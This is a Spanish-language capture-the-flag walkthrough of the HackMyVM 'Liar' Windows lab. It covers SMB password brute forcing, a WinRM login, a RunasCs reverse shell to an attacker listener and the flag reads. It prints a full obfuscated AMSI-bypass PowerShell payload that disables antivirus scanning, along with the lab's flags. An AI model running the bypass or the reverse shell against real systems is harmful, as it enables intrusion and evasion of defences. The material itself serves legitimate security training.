---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Liar HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 03:23 EDT
Nmap scan report for 192.168.1.154
Host is up (0.00037s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:5B:D0:18 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 17s
|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5b:d0:18 (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-26T07:24:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.02 seconds
```

Vemos varias cosas interesantes, entre ellas que tiene una pagina web en el puerto `80` y tambien tiene un servidor `SMB`, si intentamos enumerar de forma anonima el servidor `SMB` veremos que no nos deja, por lo que tendremos que seguir buscando.

Si entramos en la pagina web veremos unicamente eso:

```
Hey bro, You asked for an easy Windows VM, enjoy it. - nica
```

Vemos que nos estan proporcionando un nombre de usuario, por lo que vamos a utilizarlo para realizar fuerza bruta en el servidor `SMB` de la siguiente forma:

## NetExec

```shell
netexec smb <IP> -u nica -p <WORDLIST> --ignore-pw-decoding
```

Info:

```
SMB         192.168.1.154   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

Vemos que hemos encontrado las credenciales de dicho usuario, por lo que listaremos los recursos compartidos del servidor de `SMB`.

```shell
smbclient -L //<IP>/ -U nica
```

Info:

```
Password for [WORKGROUP\nica]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.154 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Veremos los recursos compartidos por defecto, por lo que no nos sirve de mucho, pero vamos a probar a conectarnos de forma remota con dichas credenciales por si fueran las mismas mediante la herramienta `evil-winrm`.

## Evil-winrm

Como antes hemos observado el puerto de `winrm` esta abierto:

```
5985/tcp  open  http
```

Por lo que podremos realizar lo siguiente, probando dichas credenciales:

```shell
evil-winrm -i <IP> -u nica -p hardcore
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nica\Documents> whoami
win-iurf14rbvgv\nica
```

Vemos que funciona por lo que tendremos una `PowerShell` de forma remota con la maquina victima como el usuario `nica`.

Vamos a leer la flag del usuario.

> user.txt

```
HMVWINGIFT
```

## Escalate user akanksha

Vamos a ver que usuarios hay:

```powershell
net user
```

Info:

```
Cuentas de usuario de \\

-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
El comando se ha completado con uno o m s errores.
```

Vemos que hay otro usuario llamado `akanksha` por lo que tiene pinta de que tendremos que intentar escalar a dicho usuario, ya que si vemos los privilegios que tenemos no veremos gran cosa.

Vamos a probar a realizar fuerza bruta desde el `SMB` con el usuario `akanksha` y ver si nos encuentra algo, ya que si nos encuentra alguna credencial puede ser que sea la misma que la del propio sistema operativo.

### NetExec akanksha

```shell
netexec smb <IP> -u akanksha -p <WORDLIST> --ignore-pw-decoding
```

Info:

```
SMB   192.168.1.154   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
```

Vemos que nos ha descubierto las credenciales de forma correcta, por lo que ahora vamos a probar a utilizarlas con dicho usuario desde el `PowerShell` de `nica`.

Como nosotros no tenemos una interfaz grafica, no podremos utilizar un simple comando de `runas` para que se nos habra una `PowerShell` autenticado como el usuario, por lo que tendremos que utilizar un ejecutable de `GitHub` que te autentica con el usuario en la misma terminal:

URL = [RunasCs.exe Download](https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip)

Una vez descargado en nuestro `host` tendremos que pasarnoslo a la maquina victima, ya que estamos en una sesion con `Evil-WinRM` podremos realizar la subida del archivo de forma facil:

```powershell
upload /home/kali/Desktop/RunasCs.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/RunasCs.exe to C:\Users\nica\Desktop\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Con esto ya tendremos el archivo subido de forma correcta, pero si diera algun error como me esta pasando a mi, podremos hacerlo de otra forma mediante el archivo `.ps1` directamente:

URL = [Invoke-RunasCs.ps1 Download](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

Vamos a pasarnoslo a la maquina victima de la misma forma que hicimos con el `.exe`:

```powershell
upload /home/kali/Desktop/Invoke-RunasCs.ps1
```

Info:

```
Info: Uploading /home/kali/Desktop/Invoke-RunasCs.ps1 to C:\Users\nica\Desktop\Invoke-RunasCs.ps1
                                        
Data: 117712 bytes of 117712 bytes copied
                                        
Info: Upload successful!
```

Ahora vamos a importarlo para despues poder ejecutarlo de la siguiente forma:

```powershell
Import-Module ./Invoke-RunasCs.ps1
```

Pero esto tambien me lo esta bloqueando el `antivirus`, por lo que os dejo una pagina que yo he creado para `Bypassear` dicho antivirus de `Windows` realizando un `Bypass` en el modulo `AMSI` que contiene las firmas de dichos `malwares`, no saldra a la primera, pero me llevo unos 30 minutos hasta que consegui uno que funcionada de los codigos que genera de forma aleatoria, os dejo el que utilice:

URL = [Bypass Modulo AMSI Pagina](https://d1se0.github.io/AMSI-Bypass-Generator/index.html)

```powershell
$JmRIgg7pbjB=$null;$J5xhHEldAdGmGsdjV=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+6814-6814));$kdiojlldvsqhsvfjwl="+[ChAr](104+62-62)+[cHAR]([bYte]0x75)";[Threading.Thread]::Sleep(457);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([ChaR]([bYTe]0x61)+[CHAR](109*65/65)+[Char]([byte]0x73)+[ChaR](105)+[cHar]([bYte]0x53)+[cHar]([byTE]0x65)+[ChaR](115*4/4)+[chaR](115+11-11)+[chAR](105*5/5)+[chAr](111*9/9)+[char]([byte]0x6e))", "NonPublic,Static").SetValue($JmRIgg7pbjB, $JmRIgg7pbjB);[Ref].Assembly.GetType("System.$([CHAr]([byTE]0x4d)+[chAr](24+73)+[cHAr](44+66)+[Char](97+66-66)+[chaR]([BYte]0x67)+[CHAR]([bYtE]0x65)+[cHAr](109+62-62)+[cHaR]([BYTe]0x65)+[cHaR]([ByTe]0x6e)+[cHar]([bYtE]0x74)).$([chaR]([bYTe]0x41)+[CHAR]([BYTe]0x75)+[CHar](116)+[chAr]([BYTE]0x6f)+[CHaR](78+31)+[chAr]([byTE]0x61)+[CHar]([Byte]0x74)+[char](6+99)+[Char](111)+[Char](110*74/74)).$([CHaR]([byte]0x41)+[char](5+104)+[ChaR]([bytE]0x73)+[chAR](105*63/63)+[cHaR](85*29/29)+[CHAR](80+36)+[CHaR](52+53)+[chAR]([BYTe]0x6c)+[ChaR](115*74/74))").GetField("$([CHAr]([BytE]0x61)+[cHar]([BytE]0x6d)+[cHaR]([BYte]0x73)+[cHaR](105)+[cHaR](67+51-51)+[cHaR](111+56-56)+[cHar]([bytE]0x6e)+[cHar]([byTe]0x74)+[ChAR](101*11/11)+[char]([bytE]0x78)+[cHar]([bYte]0x74))", "NonPublic,Static").SetValue($JmRIgg7pbjB, [IntPtr]$J5xhHEldAdGmGsdjV);$ilpowzzhhv="+('cmmîqxácìqmjzvkècmswìf'+'st').NORmaLIzE([cHar](70)+[char](111)+[cHaR](114*77/77)+[char](109+12-12)+[Char](68*1/1)) -replace [CHAR]([ByTE]0x5c)+[chaR]([ByTe]0x70)+[char]([bYTe]0x7b)+[cHAR]([ByTe]0x4d)+[cHaR]([ByTe]0x6e)+[CHAr]([bYtE]0x7d)";[Threading.Thread]::Sleep(1044)
```

Cuando enviemos esto mediante la terminal de `WinRM` si no nos aparece ningun error y ningun bloqueo significa que se ejecuto de forma correcta, por lo que ahora mismo el antivirus no va a mirar las firmas de los archivos que ejecutemos, por lo que si volvemos a realizar el siguiente comando:

```powershell
Import-Module ./Invoke-RunasCs.ps1
```

Ahora si nos dejara, no nos aparecera ningun error ni nada parecido, vamos a generarnos una `reverse shell` con dicho `script`.

Antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y en la maquina victima ejecutamos el modulo de la siguiente forma:

```powershell
Invoke-RunasCs akanksha sweetgirl powershell -Remote <IP_ATTACKER>:<PORT>
```

Info:

```
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3eb0ac$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1872 created in background.
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.154] 49761
Windows PowerShell 
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

PS C:\Windows\system32> whoami
whoami
win-iurf14rbvgv\akanksha
```

Vemos que ha funcionado, por lo que seremos dicho usuario.

## Escalate Privileges

Vamos a ver que permisos tenemos con dicho usuario:

```powershell
whoami /all
```

Info:

```
INFORMACI�N DE USUARIO
----------------------

Nombre de usuario        SID                                           
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001


INFORMACI�N DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos                                                               
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESI�N EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa��a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci�n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192                                                                                                            


INFORMACI�N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci�n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido             Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

Vemos varias cosas interesantes pero entre ellas que pertenecemos al siguiente grupo:

```
WIN-IURF14RBVGV\Idministritirs    Alias   S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
```

El grupo **`WIN-IURF14RBVGV\Idministritirs`** es el grupo de **administradores** en el sistema. Aunque su nombre está mal escrito, tiene los mismos privilegios que el grupo de administradores de Windows. Los miembros de este grupo tienen **acceso completo** al sistema, lo que les permite modificar configuraciones, instalar programas, y acceder a todos los archivos. Si un atacante obtiene acceso a este grupo, podría **controlar todo el sistema**. Es crucial limitar quién pertenece a este grupo para evitar riesgos de seguridad.

Por lo que tendremos privilegios de `administrador`, vamos a probar a entrar en la carpeta del `Administrador`:

```powershell
cd C:\Users\Administrador\
```

Y veremos que si nos deja, por lo que ya habremos terminado la maquina, leeremos la flag del `admin`.

> root.txt

```
HMV1STWINDOWZ
```
